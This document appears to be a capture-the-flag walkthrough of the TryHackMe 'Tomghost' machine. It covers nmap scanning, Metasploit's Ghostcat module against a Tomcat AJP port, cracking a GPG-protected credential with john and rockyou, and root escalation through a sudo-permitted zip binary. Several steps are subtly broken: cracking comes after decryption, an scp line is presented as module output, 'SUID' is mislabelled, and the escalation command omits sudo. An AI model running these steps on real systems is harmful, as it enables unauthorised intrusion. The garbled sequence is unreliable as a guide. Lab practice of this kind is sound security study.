# Comprehensive Guide: TomgHost 🚀

![TomGHost](tomghost.jpeg)

**Introduction**:
Embark on a challenge, exploring various stages from initial connection to privilege escalation, ensuring confidentiality and safety online. This journey involves interacting with a virtual environment, reconnaissance, and employing techniques for accessing restricted information while adhering to ethical guidelines.

**🔗 Command Breakdown & Execution**:

### 🌐 Deploying the Machine
1. **Connect to VPN**: Initiate a secure connection to access the challenge environment.
   - **Command**: `sudo openvpn yourvpnconfig.ovpn`
   - **Attributes**:
     - `yourvpnconfig.ovpn`: Your specific VPN configuration file.

### 🔍 Reconnaissance

**Step 1**: Information Gathering
- **Command**: `nmap -sC -sV -Pn <Target-IP>`
- **Attributes**:
  - `-sC`: Default script scanning.
  - `-sV`: Service version detection.
  - `-Pn`: Treats all hosts as online (skips host discovery).
  - `<Target-IP>`: The IP address of the target machine.

  ```bash
    22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
    |   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
    |_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
    53/tcp   open  tcpwrapped
    8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
    | ajp-methods: 
    |_  Supported methods: GET HEAD POST OPTIONS
    8080/tcp open  http       Apache Tomcat 9.0.30
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/9.0.30

  ```

### 🛠️ Gaining Access

**Identifying Weaknesses**:
- Engage with Metasploit to pinpoint and exploit Apache Tomcat AJP flaws.
  - **Procedure**:
    - Initiate Metasploit: `msfconsole`
    - Module Hunt: `search Apache Jserv`
    - Activate Module: `use auxiliary/admin/http/tomcat_ghostcat`
    - Define Victim: `set RHOSTS <Target-IP>`
    - Launch Attack: `run`
  - **Details**:
    - `RHOSTS`: Target machine's IP.
  - **Output**: Reveals crucial data, enabling further actions:
    ```bash
        scp skyfuck@<Target-IP>:/path/to/file /local/path
    ```

**Decrypting Secrets**:
- Import key and decrypt sensitive information for deeper insight.
  - **Steps**:
    1. Import Encryption Key: 
        ```bash
            gpg --import tryhackme.asc
        ```
    2. Decrypt Information: 
        ```bash
            gpg --decrypt credential.pgp > decrypted_credentials.txt
        ```
    3. Cracking Passphrase: 
       ```bash
            john --wordlist=/usr/share/wordlists/rockyou.txt decrypted_credentials.txt`
       ```
       
### 🔑 Privilege Escalation

**Step 4**: Elevating Privileges
1. **Identifying SUID Files**: Search for files with unusual SUID permissions.
   ```bash
        sudo -l
        Matching Defaults entries for merlin on ubuntu:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User merlin may run the following commands on ubuntu:
            (root : root) NOPASSWD: /usr/bin/zip
   ```
2. **Escalating Privileges**: Utilize unusual permissions for escalating access.
    ```bash
        TF=$(mktemp -u)
        ./zip $TF /etc/hosts -T -TT 'sh #'
    ```

**Conclusion**:

This guide illustrates a structured approach to ethical hacking, emphasizing command execution, attribute understanding, and the significance of security practices.